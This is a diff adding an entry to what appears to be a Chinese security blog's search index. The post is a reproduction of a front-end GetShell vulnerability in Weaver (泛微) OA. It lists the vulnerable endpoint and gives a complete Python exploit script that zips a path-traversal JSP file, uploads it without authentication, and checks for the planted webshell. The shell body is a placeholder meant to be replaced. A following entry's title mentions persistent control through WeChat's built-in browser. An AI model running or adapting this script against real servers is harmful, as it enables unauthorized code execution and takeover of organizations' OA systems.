@@ -31,6 +31,33 @@
     
     
     <entry>
+      <title>泛微OA 前台GetShell复现</title>
+      <link href="2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/"/>
+      <url>2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE1.webp" alt="image"></p><h3 id="漏洞路径："><a href="#漏洞路径：" class="headerlink" title="漏洞路径："></a>漏洞路径：</h3><pre><code>/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp</code></pre><h3 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h3><h4 id="发送上传数据包："><a href="#发送上传数据包：" class="headerlink" title="发送上传数据包："></a>发送上传数据包：</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE2.webp" alt="image"></p><h4 id="验证结果："><a href="#验证结果：" class="headerlink" title="验证结果："></a>验证结果：</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE3.webp" alt="image"></p><h3 id="懒人"><a href="#懒人" class="headerlink" title="懒人:"></a>懒人:</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE4.webp" alt="image"></p><pre><code>import zipfileimport randomimport sysimport requestsdef generate_random_str(randomlength=16):  random_str = &#39;&#39;  base_str = &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;  length = len(base_str) - 1  for i in range(randomlength):    random_str += base_str[random.randint(0, length)]  return random_strmm = generate_random_str(8)webshell_name1 = mm+&#39;.jsp&#39;webshell_name2 = &#39;../../../&#39;+webshell_name1def file_zip():    shell = &quot;&quot;&quot;test123    &quot;&quot;&quot;   ## 替换shell内容    zf = zipfile.ZipFile(mm+&#39;.zip&#39;, mode=&#39;w&#39;, compression=zipfile.ZIP_DEFLATED)    zf.writestr(webshell_name2, shell)def GetShell(urllist):    file_zip()    print(&#39;上传文件中&#39;)    urls = urllist + &#39;/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp&#39;    file = [(&#39;file1&#39;, (mm+&#39;.zip&#39;, open(mm + &#39;.zip&#39;, &#39;rb&#39;), &#39;application/zip&#39;))]    requests.post(url=urls,files=file,timeout=60, verify=False)    GetShellurl = urllist+&#39;/cloudstore/&#39;+webshell_name1    GetShelllist = requests.get(url = GetShellurl)    if GetShelllist.status_code == 200:        print(&#39;利用成功webshell地址为:&#39;+GetShellurl)    else:        print(&#39;未找到webshell利用失败&#39;)def main():    if (len(sys.argv) == 2):        url = sys.argv[1]        GetShell(url)    else:        print(&quot;python3 lgo.py http://xx.xx.xx.xx&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 泛微 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>关于微信内置浏览器 达到持久控制</title>
       <link href="2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/"/>
       <url>2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/</url>
